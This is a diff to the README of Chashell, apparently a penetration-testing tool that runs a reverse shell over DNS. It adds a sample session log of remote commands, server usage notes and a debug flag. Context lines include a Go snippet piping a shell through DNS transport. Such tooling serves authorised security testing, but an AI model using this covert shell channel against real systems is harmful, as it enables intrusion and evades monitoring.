@@ -34,7 +34,7 @@ We tested those systems and it works without issues :
 
 * Windows (386/amd64)
 * Linux (386/amd64/arm64)
-* Mac OS X (386/amd64)
+* OS X (386/amd64)
 
 ### How to use Chaserv/Chashell
 
@@ -92,6 +92,7 @@ The client should now connect back to `chaserv`:
 
 ```
 [n.chatelain]$ sudo ./chaserv
+chashell >>> New session : 5c54404419e59881dfa3a757
 chashell >>> sessions 5c54404419e59881dfa3a757
 Interacting with session 5c54404419e59881dfa3a757.
 whoami
@@ -104,6 +105,11 @@ dev
 usr
 var
 ```
+
+Use the *sessions [sessionid]* command to interact with a client.
+When interacting with a session, you can use the *background* session in order to return to the *chashell* prompt.
+
+Use the *exit* command to close *chaserv*.
 
 ## Implement your own
 
@@ -120,9 +126,16 @@ cmd.Stdin = dnsTransport
 cmd.Run()
 ```
 
+## Debugging
+
+For more verbose messages, add *TAGS=debug* at the end of the make command.
+
 ## To Do
 
 * Implement asymmetric cryptography ([Curve25519](https://en.wikipedia.org/wiki/Curve25519), [XSalsa20](https://en.wikipedia.org/wiki/Salsa20) and [Poly1305](https://en.wikipedia.org/wiki/Poly1305))
 * Retrieve the host name using the `InfoPacket` message.
 * Create a *proxy/relay* tool in order to tunnel TCP/UDP streams. (Meterpreter over DNS !)
 
+## Credits
+
+* Nicolas Chatelain <n.chatelain -at- sysdream.com>
